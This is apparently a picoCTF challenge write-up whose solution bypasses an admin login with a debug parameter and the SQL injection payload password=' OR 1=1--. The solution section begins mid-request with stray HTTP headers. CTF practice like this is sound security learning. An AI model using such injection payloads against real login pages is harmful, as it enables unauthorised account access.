# Description

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or `http://jupiter.challenges.picoctf.org:54253`. Try to see if you can login as admin!

# Hints

Seems like the password is encrypted.

# Solution

Priority: u=0, i

Connection: keep-alive

password=a&debug=1
```

- After enabling debug mode, you can try additional SQL Injection attacks to exploit the vulnerability of the website. For example, we can change the password to:
``` console
password=' OR 1=1--&debug=1
```
